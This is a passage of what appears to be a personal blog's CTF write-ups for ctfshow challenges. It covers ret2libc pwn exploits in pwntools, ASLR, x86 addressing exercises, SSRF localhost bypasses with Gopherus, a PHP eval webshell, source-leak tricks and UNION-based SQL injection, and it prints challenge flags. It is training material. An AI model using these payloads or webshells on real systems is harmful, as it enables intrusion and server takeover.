的地址是可以的，但这样做可能导致栈上的数据错乱，影响函数参数的正确传递。</span></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>总结的来说，就是利用两次公式和一个可用的函数，payload两次。在后一个payload通过sys和binsh的拼接拿到shell。在前一个payload我们需要通过程序本身来拿到可用的函数puts的真实地址，然后通过此地址计算出sys的地址和binsh字符串的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">公式：</span><br><span class="line">	正着理解：puts的地址=libc当中puts的地址+libc的基地址（puts函数调用就是这样的）</span><br><span class="line">    思想滑坡：libc的基地址=puts的地址-libc当中puts的地址</span><br></pre></td></tr></table></figure>
<h1>pwn26</h1>
<p>什么是ASLR?<br>
大多数的攻击都基于这样一个前提，即攻击者知道程序的内存布局，需要提前知道shellcode或者其他一些数据的位置。因此，引入内存布局的随机化能够有效增加漏洞利用的难度，其中一种技术就是ASLR（Address Space Layout Randomization）。ASLR提供的只是概率上的安全性，根据用于随机化的熵，攻击者有可能幸运地猜到正确的地址，有时攻击者还可以爆破。</p>
<p>在Linux上，ASLR的全局配置/proc/sts/kernel/randomize_va_space有三种情况：0表示关闭ASLR；1表示部分开启（将mmap的基址，stack和vdso页面随机化）；2表示完全开启（在部分开启的基础上增加heap的随机化）。如下：</p>
<p><img src="dca1d09a503d59cfce1fcec2afad6776.png" alt="在这里插入图片描述"></p>
<p>我们可以修改/proc/sts/kernel/randomize_va_space文件的值来配置ASLR。</p>
<p><img src="image-20250120195919434.png" alt="image-20250120195919434"></p>
<p>大致意思：查看我们的ASLR，如果内容为0则给出正确的flag，如果不是0，则给出错误的flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">su root</span><br><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">./pwn</span><br></pre></td></tr></table></figure>
<p>ctfshow{0x400687_0x400560_0x6032a0_0x7ffff7fbb6b0}</p>
<h1>pwn27</h1>
<p><img src="image-20250120200224239.png" alt="image-20250120200224239"></p>
<p>大致意思和pwn26差不多，只是ASLR变成了1或者0都可以</p>
<h1>pwn28</h1>
<p>什么限制都没有，直接给flag了</p>
<h1>pwn29</h1>
<p>他就是让我们知道ASLR的作用(随机地址)，然后flag又直接给我们了</p>
<p>在启用 ASLR（Address Space Layout Randomization）和 PIE（Position Independent Executable）后，系统会随机化内存布局，但是随机化的仅仅是对象的起始地址，而不会随机化对象内部的结构和相对偏移</p>
<h1>pwn30</h1>
<p>方法和pwn25相同，可以拿来练习一下</p>
<p>ctfshow{937ddff1-75d3-40ed-8607-54bfd164b92d}</p>
<h1>pwn31</h1>
<p>各种wp都说对新手不太友好</p>
<p>但是我们要勇于挑战自己</p>
<p>做完了，其实奥，其实，就是pwn25加了一点别的</p>
<p>这里需要补充知识：</p>
<p>打开ASLR的时候需要用绝对地址，而我们在pwn25当中使用的是相对地址</p>
<p>如果ASLR没有打开的时候，使用绝对地址也是可以的</p>
<table>
<thead>
<tr>
<th>绝对地址：表示程序加载到内存后，符号（如函数）在内存中的实际位置。它是在程序执行时才能确定的。</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>相对地址（如 <code>elf.plt['puts']</code>）</strong>：它是静态的，通常在程序编译时确定，表示函数在 ELF 文件中的偏移位置。</td>
</tr>
<tr>
<td>真实地址：ASLR打开之后地址会改变，改变之后的地址就是真实地址</td>
</tr>
<tr>
<td>总的来说：绝对地址就像是在文件当中的地址；相对地址就像是程序运行时在内存当中的地址</td>
</tr>
</tbody>
</table>
<p>写exp的思路：1.泄露puts地址。2.计算libc基地址。3.获取sys和binsh的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28151</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">main_real_addr = <span class="built_in">int</span>(p.recv().strip(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_real_addr))</span><br><span class="line">base_addr = main_real_addr - elf.sym[<span class="string">&#x27;main&#x27;</span>] </span><br><span class="line"><span class="comment"># sym 是 ELF 对象的一个属性，它是一个字典，包含了 ELF 文件中所有符号表项的名称与对应地址。这里是指返回main函数的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于ASLR打开了，所以，这里需要用到绝对地址</span></span><br><span class="line">puts_plt = base_addr + elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = base_addr + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ctfshow_addr = base_addr +elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line"><span class="comment"># 0x1fc0是.got的真实地址。这里的作用是将寄存器恢复原状，原因是在此程序当中，后续还需要寄存器ebx,如果不恢复，这个程序将会“崩溃”</span></span><br><span class="line">ebx = base_addr + <span class="number">0x1fc0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#总共需要140个才可以溢出，但是，有大佬说133-136位其实在两题的代码中一直都有特殊意义。为什么是133-136位？你怎么知道是133-136位的？</span></span><br><span class="line">payload = <span class="number">132</span> * <span class="string">b&#x27;a&#x27;</span> + p32(ebx) + <span class="number">4</span> * <span class="string">b&#x27;a&#x27;</span> +p32(puts_plt) + p32(main_real_addr) +p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload = <span class="number">140</span> * <span class="string">b&#x27;a&#x27;</span> +p32(system_addr) +p32(ctfshow_addr) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>ctfshow{b53d77c9-84f9-4bf3-87ae-17bbca44b4c7}</p>
<h1>总结</h1>
<p>1.当checksec查看RELRO时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。</span><br><span class="line"></span><br><span class="line">RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。</span><br><span class="line"></span><br><span class="line">RELRO为No RELRO时，表示.got与.got.plt都可写。</span><br></pre></td></tr></table></figure>
<p>2.signal(11, (__sighandler_t)sigsegv_handler);这段代码会检测我们利用栈溢出，一旦溢出，会运行其中的sigsegv_handler函数</p>
<p>3.shell：相当于我们windows上面的cmd</p>
<p>4.exp是我们利用程序漏洞，编写出的可以拿到服务端的shell的代码</p>
<p>熬穿了，睡觉了，知识点明天再补</p>
]]></content>
      <tags>
        <tag>ctfshow_pwn_前置基础</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn6-12</title>
    <url>/2025/01/19/pwn6-12/</url>
    <content><![CDATA[<h2 id="前置基础">前置基础</h2>
<h3 id="pwn6-pwn12知识点">pwn6-pwn12知识点</h3>
<p>数据的寻址方式:</p>
<p>​	1 指令和数据的寻址方式</p>
<p>​	2 数据寻址方式说明</p>
<p>​	3 立即寻址</p>
<p>​	4 直接寻址</p>
<p>​	5 （存储器）间接寻址</p>
<p>​	6 寄存器寻址</p>
<p>​	7 寄存器间接寻址</p>
<p>​	8 相对地址</p>
<p>​	9 相对基址寻址</p>
<p>​	10 相对变址寻址</p>
<p>​	11 相对基址变址寻址</p>
<p><strong>寄存器间接寻址</strong></p>
<p><strong>格式：[寄存器]</strong></p>
<p>说明：指令中指定一个寄存器，该寄存器中存放的是操作数的有效地址，通过访问该寄存器所指向的内存单元来获取操作数。例如在 8086 汇编语言中，MOV AX,[BX]，这里BX寄存器中存放的是一个内存地址，将该地址中的数据传送到AX寄存器中。</p>
<p><strong>基址寻址</strong></p>
<p><strong>格式：[基址寄存器 + 位移量]</strong></p>
<p>说明：以一个基址寄存器的内容为基准地址，再加上一个位移量来形成操作数的有效地址。如MOV AX,[BX + 10H]，BX是基址寄存器，10H是位移量，将BX寄存器中的值加上10H得到的地址中的数据传送到AX寄存器。</p>
<p><strong>变址寻址</strong></p>
<p><strong>格式：[变址寄存器 + 位移量]</strong></p>
<p>说明：与基址寻址类似，但使用变址寄存器来提供地址偏移量。例如MOV AX,[SI + 20H]，SI是变址寄存器，20H是位移量，把SI寄存器中的值加上20H所指向的内存单元中的数据传送到AX寄存器。</p>
<p><strong>基址变址寻址</strong></p>
<p><strong>格式：[基址寄存器 + 变址寄存器] 或 [基址寄存器 + 变址寄存器 + 位移量]</strong></p>
<p>说明：将基址寄存器和变址寄存器的内容相加，再加上可选的位移量来形成操作数的有效地址。例如在 8086 中MOV AX,[BX + SI] 或者MOV AX,[BX + SI + 30H]，通过这种方式可以更灵活地访问二维数组等数据结构。</p>
<p><strong>相对寻址</strong></p>
<p><strong>格式：[程序计数器 (PC) + 位移量]</strong></p>
<p>说明：以程序计数器当前的值为基准，加上一个位移量来形成转移目标地址。常用于程序的分支跳转指令，如JMP 10H[PC]，表示跳转到当前程序计数器的值加上10H后的地址处继续执行程序。</p>
<p><strong>间接间接寻址</strong></p>
<p><strong>格式：[[寄存器]]</strong></p>
<p>说明：先访问指令中指定的寄存器，该寄存器中存放的是另一个内存单元的地址，再通过这个地址去访问最终的操作数。例如MOV AX,[[BX]]，先取BX寄存器中的值作为一个地址，再取该地址中的值作为最终操作数的地址，将该最终地址中的数据传送到AX寄存器。</p>
<h3 id="pwn5">pwn5</h3>
<p>题目信息：立即寻址方式结束后eax寄存器的值为？</p>
<p><img src="image-20250113120703387.png" alt="image-20250113120703387"></p>
<p>打开之后，没错，就是这个界面，刚开始的时候我以为这是我ida开错了</p>
<img src="image-20250113120727880.png" alt="image-20250113120727880">
<p>eax\ebx\ecx\edx都在这里</p>
<p>我们需要eax</p>
<p><img src="image-20250113120828151.png" alt="image-20250113120828151"></p>
<p>mov是移动的意思，这里指eax=0Bh（h是十进制的意思）</p>
<p>Add就是加的意思eax+=1BF48h</p>
<p>sub是subtract（减）的缩写</p>
<p>所以最终的eax=B+BF48-1=114514</p>
<p>Ctfshow{114514}</p>
<h3 id="pwn7">pwn7</h3>
<p>题目信息:寄存器寻址方式结束后edx寄存器的值为？</p>
<p><img src="image-20250113121038920.png" alt="image-20250113121038920"></p>
<p>Ebx=36D</p>
<p>Edx=ebx</p>
<p>综上edx=36D</p>
<p>注意大小写</p>
<h3 id="pwn8">pwn8</h3>
<p>题目信息:直接寻址方式结束后ecx寄存器的值为？</p>
<p><img src="image-20250113121123869.png" alt="image-20250113121123869"></p>
<p>Ecx=dword_80490E8</p>
<p>dword_80490E8的地址是0x80490E8(双击跟进dword_80490E8)</p>
<p><img src="wps1.jpg" alt="img"></p>
<p>也就说把dword_80490E8的地址0x80490E8赋值给了ecx</p>
<p>{0x80490E8}</p>
<h3 id="pwn9">pwn9</h3>
<p>题目信息:寄存器间接寻址方式结束后eax寄存器的值为？</p>
<p><img src="wps2.jpg" alt="img"></p>
<p>括号[]的意思是将esi所指向的地址的值赋值给eax</p>
<p>Esi, offset dword_80490E8的意思是将msg(massage,这里是指dword_8090E8)的地址赋值给esi</p>
<p>那么值为什么呢？双击！跟进</p>
<p><img src="wps3.jpg" alt="img"></p>
<p>{0x636C6557}</p>
<h3 id="pwn10">pwn10</h3>
<p>题目信息:寄存器相对寻址方式结束后eax寄存器的值为？</p>
<p><img src="wps4.jpg" alt="img"></p>
<p>最终eax=[0x80490E8+4]=[0x80490EC]=ome_to_CTFshow_PWN</p>
<p><img src="wps5.jpg" alt="img"></p>
<h3 id="pwn11">pwn11</h3>
<p>题目信息:基址变址寻址方式结束后的eax寄存器的值为？</p>
<p>基址变址寻址方式结束后的eax寄存器的值为？</p>
<p><img src="wps6.jpg" alt="img"></p>
<p>Eax=[0x80490E8+2*2]=[80490EC]=ome_to_CTFshow_PWN</p>
<h3 id="pwn12">pwn12</h3>
<p>相对基址变址寻址方式结束后eax寄存器的值为？</p>
<p><img src="wps7.jpg" alt="img"></p>
<p>Eax=[0x80490E8+1+8*2-6]=[80490EC]=ome_to_CTFshow_PWN</p>
]]></content>
      <tags>
        <tag>ctfshow_pwn_前置基础</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf</title>
    <url>/2025/03/05/ssrf/</url>
    <content><![CDATA[<h1>ssrf漏洞介绍</h1>
<p>我们可以通过外网连到服务器。服务器可以访问内部网络。</p>
<p>我们可以通过外网以服务器为媒介访问内部网络。</p>
<p><code>parse_url()</code> 是 PHP 中的一个内置函数，用于解析一个 URL 并将其分解为各个组成部分，例如协议（scheme）、主机名（host）、端口（port）、路径（path）、查询字符串（query）和锚点（fragment）等。</p>
<h1>parse_url()</h1>
<p><img src="image-20250304195640159.png" alt="image-20250304195640159"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">						 <span class="title function_ invoke__">parse_url</span>()  </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname			//</span><br><span class="line">    [user] =&gt; username			@前</span><br><span class="line">    [pass] =&gt; password			@前</span><br><span class="line">    [path] =&gt; /path				/</span><br><span class="line">    [query] =&gt; arg=value		?以后的key=value</span><br><span class="line">    [fragment] =&gt; anchor		#以后的部分</span><br><span class="line">)</span><br><span class="line">	/path</span><br></pre></td></tr></table></figure>
<p><code>@</code> 的作用</p>
<p>在 URL 中，<code>@</code> 的作用是明确地将用户名和密码与主机名区分开。它的语法格式为：</p>
<p>用户名:密码@主机名</p>
<h1>web351</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1/flag.php</span><br><span class="line">url=file://var/www/html/flag.php</span><br></pre></td></tr></table></figure>
<h1>web352</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">十六进制</span><br><span class="line">  url=http:<span class="comment">//0x7F.0.0.1/flag.php</span></span><br><span class="line"></span><br><span class="line">八进制</span><br><span class="line">  url=http:<span class="comment">//0177.0.0.1/flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span> 进制整数格式</span><br><span class="line">  url=http:<span class="comment">//2130706433/flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="number">0</span>x</span><br><span class="line">  url=http:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line"></span><br><span class="line">还有一种特殊的省略模式</span><br><span class="line">  <span class="number">127.0</span>.<span class="number">0.1</span>写成<span class="number">127.1</span></span><br><span class="line"></span><br><span class="line">用CIDR绕过localhost</span><br><span class="line">  url=http:<span class="comment">//127.127.127.127/flag.php</span></span><br><span class="line"></span><br><span class="line">还有很多方式</span><br><span class="line">  url=http:<span class="comment">//0/flag.php</span></span><br><span class="line">  url=http:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>web353</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br><span class="line">url=http:<span class="comment">//127.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0x7f.0.0.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0177.0.0.1/flag.php</span></span><br></pre></td></tr></table></figure>
<h1>web354</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">奇淫巧技：将域名A类指向<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="title function_ invoke__">http</span>(s):<span class="comment">//sudo.cc/指向127.0.0.1</span></span><br><span class="line"></span><br><span class="line">url=http:<span class="comment">//sudo.cc/flag.php</span></span><br><span class="line"></span><br><span class="line">也可以跳转到一个自己搭建的网站，再通过自己网站的自动跳转</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="comment"># POST: url=http://your-domain/ssrf.php</span></span><br></pre></td></tr></table></figure>
<h1>web355</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br><span class="line"><span class="number">127.1</span></span><br></pre></td></tr></table></figure>
<h1>web356</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br></pre></td></tr></table></figure>
<h1>web357</h1>
<p><a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">DNS重绑定</a></p>
<p><img src="image-20250304203200017.png" alt="image-20250304203200017"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//7f000001.01010117.rbndr.us/flag.php</span></span><br></pre></td></tr></table></figure>
<h1>web358</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//ctf.@127.0.0.1/flag.php?show</span></span><br></pre></td></tr></table></figure>
<h1>web359</h1>
<p>这题用到Gopher，链接如下(必看)</p>
<p><a href="https://blog.csdn.net/qq_57172130/article/details/126169480">SSRF利用协议中的万金油——Gopher</a></p>
<p>Gopher介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gopher协议及其应用</span><br><span class="line">【网络安全 | HTTP】 gopher协议原理、语法及利用总结-CSDN …</span><br><span class="line">https://blog.csdn.net/2301_77485708/article/details/132052102</span><br><span class="line">gopher协议的利用 - FreeBuf网络安全行业门户</span><br><span class="line">https://www.freebuf.com/articles/web/337824.html</span><br><span class="line">SSRF利用协议中的万金油——Gopher_dict协议-CSDN博客</span><br><span class="line">https://blog.csdn.net/qq_50854662/article/details/129180268</span><br><span class="line"></span><br><span class="line">Gopher协议是一种早期的互联网协议，主要用于在网络上获取文本信息。它在1991年提出，设计目的是提供一种简单且高效的方式来浏览和访问文件。Gopher协议通过类似文件系统的层次结构来组织数据，每个项目都有一个唯一的标识符。用户可以通过Gopher客户端软件浏览目录，选择下载或查看文件。Gopher服务器能够提供文本文件、图像文件、二进制文件等多种类型的文件。</span><br><span class="line"></span><br><span class="line">与HTTP相比，Gopher协议具有更简单的设计和较少的功能，它基于传输控制协议（TCP）进行通信，默认端口号为70。然而，随着万维网的崛起和HTTP的普及，Gopher协议逐渐被取代。</span><br><span class="line"></span><br><span class="line">Gopher协议的利用</span><br><span class="line"></span><br><span class="line">Gopher协议可以被用来攻击内网的Redis、Mysql、FastCGI、Ftp等服务，也可以发送GET、POST请求，这样可以拓宽SSRF（服务器端请求伪造）的攻击面。例如，当SSRF无法通过HTTP协议传递POST数据时，可以使用Gopher协议来发起POST请求。</span><br><span class="line"></span><br><span class="line">Gopher协议的语法</span><br><span class="line"></span><br><span class="line">Gopher协议的格式通常为：</span><br><span class="line"></span><br><span class="line">gopher://hostname:port/请求方法(get、post等)/path</span><br><span class="line">其中，hostname表示Gopher服务器的主机名或IP地址，port表示Gopher服务器监听的端口号（默认为70），path则是资源的路径。例如，要请求Gopher服务器上的/example/file.txt文本文件，可以使用上述格式的URL。</span><br><span class="line"></span><br><span class="line">Gopher协议在SSRF攻击中的应用</span><br><span class="line"></span><br><span class="line">在SSRF攻击场景中，利用Gopher协议可以实现多个数据包的整合发送。这种方法可以用于攻击内网的FTP、Telnet、Redis、Memcache等服务。Gopher协议的强大之处在于它可以通过构造特定的请求，来执行对内网服务的攻击，例如写入定时任务或SSH公钥，甚至是执行SQL语句来写入Webshell。</span><br><span class="line">Gopher协议在各个编程语言中的支持情况不同，例如PHP需要--with-curlwrappers且版本至少为5.3，Java版本小于JDK1.7，而Curl的低版本不支持Gopher协议</span><br><span class="line"></span><br><span class="line">结论</span><br><span class="line"></span><br><span class="line">Gopher协议虽然在现代互联网中已不常用，但在网络安全领域，它仍然是一个强大的工具。它的简单性和灵活性使得它在特定的攻击场景中非常有用，尤其是在SSRF攻击中扩展攻击面。因此，了解Gopher协议的工作原理和应用方式对于网络安全防范至关重要</span><br></pre></td></tr></table></figure>
<p>根据我的理解，gopher可以写入文件。</p>
<p>进去之后是一个登录界面，sql没有用、弱口令也没有用，抓包之后发现有一个returl=…，修改也没有用。</p>
<p>wp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载gopher</span><br><span class="line">git clone https://github.com/tarunkant/Gopherus.git</span><br><span class="line">cd Gopherus</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit mysql</span><br><span class="line"></span><br><span class="line">username:root</span><br><span class="line">写入一句话木马</span><br><span class="line">select &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &#x27;/var/www/html/2.php&#x27;;</span><br></pre></td></tr></table></figure>
<p>之后可以访问2.php然后getshell，最终拿flag</p>
<h1>web360</h1>
<p>和上面差不多</p>
<p>差别：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit redis</span><br><span class="line">PHPShell</span><br><span class="line">ctfshow</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>web1-10</title>
    <url>/2025/01/19/web1-10/</url>
    <content><![CDATA[<h1>Web1:</h1>
<p><img src="wps1.jpg" alt="img"></p>
<p>直接f12。看到flag</p>
<p>ctfshow{941628a1-7381-4612-9c0f-201bede5949c}</p>
<h1>Web2:</h1>
<p><img src="wps2.jpg" alt="img"></p>
<p>看不了源码（右键不管用、f12不管用）</p>
<p>法一：不怕抓包</p>
<p>法二：firefox浏览器直接ctrl+u看源码</p>
<p>ctfshow{836f5d1a-952d-41fb-a059-748adf37147</p>
<h1>Web3:</h1>
<p><img src="wps3.jpg" alt="img"></p>
<p>啥都没有，bp抓包</p>
<p>ctfshow{f40cb561-9170-4abf-96b5-422812ef996f}</p>
<h1>Web4:</h1>
<p>bp抓包</p>
<p>没思路，看题目提示：总有人把后台地址写入robots，帮黑阔大佬们引路。</p>
<p>Robots:即robots.txt。这个文件可能会泄露部分网站目录</p>
<p>在url后面添加/robots.txt</p>
<p><img src="wps4.jpg" alt="img"></p>
<p>复制/flagishere.txt，替换url后面的robots.txt</p>
<p>进去</p>
<p>ctfshow{5e980d7b-1652-4fd2-aa6f-fb9ce4e92f8d}</p>
<h1>Web5</h1>
<p>Bp抓包无果，查看提示：phps源码泄露有时候能帮上忙</p>
<p>这道题是php源码泄露，查看响应头，</p>
<p><img src="wps5.jpg" alt="img"></p>
<p>X-Powered-Bys后面是php及其版本。</p>
<p>php的主页文件是index.php</p>
<p>访问index.php发现还是原来的界面</p>
<p>然后在后面加一个s可以下载一个文件</p>
<p>ctfshow{fb1c7fe7-f1d8-47de-be54-2a32756be6c8}</p>
<h1>Web6</h1>
<p>看提示:解压源码到当前目录，测试正常，收工</p>
<p>网站主页源码文件名称为www.zip，然后再url后添加/www.zip对网站主页源码进行下载,然后进行解压</p>
<p><img src="wps6.jpg" alt="img"></p>
<p>ctfshow{83099411-6ed3-4ec1-9336-8fe1d68f5bad}</p>
<h1>Web7:</h1>
<p>提示:版本控制很重要，但不要部署到生产环境更重要。</p>
<p>git代码泄露，直接访问/.git即可</p>
<p>在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.git隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
<p>ctfshow{3caad85e-71c8-4867-9a13-a6cc8a85c4ff}</p>
<h1>Web8:</h1>
<p>提示:版本控制很重要，但不要部署到生产环境更重要。</p>
<p>svn泄露,直接访问/.svn即可</p>
<p>在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.svn隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
<p>ctfshow{2c8a2ed9-20cd-4c41-b0a6-42a3801bf904}</p>
<h1>Web9</h1>
<p>提示:发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p>
<p>vim缓存信息泄露，直接访问/index.php.swp即可</p>
<p>ctfshow{6b667116-0c5a-4fca-b6ad-f589fc29fb9f}</p>
<h1>Web10</h1>
<p>提示:cookie 只是一块饼干，不能存放任何隐私数据</p>
<p><img src="wps7.jpg" alt="img"></p>
<p>ctfshow{f7c26679-f08a-40c9-aff2-6a373d3a17c8}</p>
<h1><em><strong>1–10总结</strong></em></h1>
<p>1.无法查看源码？Firefox当中ctrl+u查看|bp|设置当中点出来</p>
<p>/robots.txt会泄露部分网站目录</p>
<p>2.php源码泄露：X-Powered-Bys后面是php及其版本。php的主页文件是index.php。然后在后面加一个s可以下载一个文件</p>
<p>3.网站主页源码文件名称为www.zip。/www.zip对网站主页源码进行下载,然后进行解压。本地看过之后在url进行操作</p>
<p>4.在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.svn或者.git隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
<p>5.vim缓存信息泄露，/index.php.swp</p>
]]></content>
      <tags>
        <tag>ctfshow_web_命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2025/02/05/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1>一</h1>
<p>我们传入?id=1</p>
<p>正常回显</p>
<p>传入?id=1’</p>
<p>不能正常回显</p>
<p>但是后面加上 --+可以正常回显</p>
<p>–是注释的作用</p>
<p><strong>–</strong>：</p>
<ul>
<li>在 SQL 中，<code>--</code> 是单行注释符号，表示从 <code>--</code> 开始到行尾的内容都会被数据库忽略。</li>
</ul>
<p><strong>+</strong></p>
<ul>
<li><code>+</code> 是一个 URL 编码的空格字符。在 HTTP 请求中，空格通常会被编码为 <code>+</code>。</li>
<li>在 SQL 注入中，攻击者可能会将 <code>--</code> 后面的空格替换为 <code>+</code>，以确保注释符号被正确解析。</li>
</ul>
<p>?id=1’order by 3–+</p>
<p>传入之后回显正常，当把3改为4或者更大的数的话就会报错，说明这里的字段数为3</p>
<p>这叫<strong>探测字段数量</strong>，攻击者通常需要知道查询结果返回的字段数量</p>
<p>?id=-1’union select 1,2,3–+</p>
<p><strong>为什么前面的数字是 <code>-1</code>？</strong></p>
<p>在 SQL 注入中，<code>id=-1</code> 的目的是确保原始查询不返回任何结果，从而使攻击者构造的 <code>UNION SELECT</code> 结果能够显示在页面上。那么id可以为任何数字，只要不是正常的数字</p>
<p><strong><code>UNION SELECT</code> 的作用</strong></p>
<p><code>UNION</code> 是 SQL 中的一个操作符，用于将两个或多个 <code>SELECT</code> 语句的结果集合并。将攻击者构造的查询结果合并到原始查询的结果中。</p>
<p>假设原始查询为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT id, name, email FROM users WHERE id = 1;</span><br></pre></td></tr></table></figure>
<p>攻击者可以通过 <code>UNION SELECT</code> 注入以下 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT id, name, email FROM users WHERE id = -1 UNION SELECT 1, 2, 3;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>UNION SELECT 1, 2, 3</code>：返回 3 个字段，字段值分别为 <code>1</code>, <code>2</code>, <code>3</code>。</li>
<li>如果页面显示了 <code>1, 2, 3</code>，说明注入成功。</li>
</ul>
<p>?id=-1’union select 1,database(),version()–+</p>
<p>根据前面的回显我们知道我们可以选择替换2和3可以看到回显所以这里用2和3的位置来看当前<strong>数据库名</strong>和<strong>版本号</strong>，这些是mysql当作的函数，需要记忆</p>
<p>?id=-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’–+</p>
<p><strong>爆表</strong>，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。也就是下面表格user和passwd。</p>
<ul>
<li>
<p><code>group_concat(table_name)</code>：将 <code>table_name</code> 字段的值连接成一个字符串，方便一次性获取所有表名。</p>
</li>
<li>
<p><code>table_schema</code>：<code>information_schema.tables</code> 中的一个字段，表示表所属的数据库名称。</p>
</li>
<li>
